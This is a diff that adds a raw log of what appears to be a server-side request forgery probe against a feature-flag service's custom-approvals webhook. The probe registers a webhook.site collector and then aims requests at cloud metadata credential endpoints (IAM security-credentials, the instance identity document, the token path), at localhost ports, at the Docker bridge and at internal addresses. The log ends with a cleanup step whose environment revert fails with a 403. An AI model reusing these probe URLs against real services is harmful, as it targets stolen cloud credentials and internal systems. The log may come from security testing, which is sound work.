@@ -1,0 +1,27 @@
+collector -> 201 5e9b7273-336d-4fb4-8e65-437e79299d8b
+flag -> 201
+[ctrl] https://webhook.site/5e9b7273-336d-4fb4-8e65-437e79299d8b
+    -> 400 ERR: Unable to parse approval response:
+This URL has no default content configured. <a href="https://webhook.site/#!/edit/5e9b7273-336d-4fb4-8e65-437e79299d8b">Change response in Webhook.site</a>.
+[imds-roles] http://169.254.169.254/latest/meta-data/iam/security-credentials/?zeno=1
+    -> 503 ERR: Unsuccessful custom-approvals approval creation request. Received status code 0 from external service.
+[imds-doc] http://169.254.169.254/latest/dynamic/instance-identity/document?zeno=1
+    -> 503 ERR: Unsuccessful custom-approvals approval creation request. Received status code 0 from external service.
+[imds-token] http://169.254.169.254/latest/api/token?zeno=1
+    -> 503 ERR: Unsuccessful custom-approvals approval creation request. Received status code 0 from external service.
+[lh8080] http://127.0.0.1:8080?zeno=1
+    -> 503 ERR: Unsuccessful custom-approvals approval creation request. Received status code 0 from external service.
+[lh9999] http://127.0.0.1:39999?zeno=1
+    -> 503 ERR: Unsuccessful custom-approvals approval creation request. Received status code 0 from external service.
+[dockbridge] http://172.17.0.1?zeno=1
+    -> 503 ERR: Unsuccessful custom-approvals approval creation request. Received status code 0 from external service.
+[rfc10] http://10.0.0.1?zeno=1
+    -> 503 ERR: Unsuccessful custom-approvals approval creation request. Received status code 0 from external service.
+[nx] http://zeno-nx-r21-c1a2.invalid?zeno=1
+    -> 503 ERR: Unsuccessful custom-approvals approval creation request. Received status code 0 from external service.
+
+=== CLEANUP ===
+env revert -> 403
+verify: {"required": false, "bypassApprovalsForPendingChanges": false, "minNumApprovals": 1, "canReviewOwnRequest": false, "canApplyDeclinedChanges": true, "serviceKind": "launchdarkly", "
+flag DEL -> 204
+collector DEL -> 204
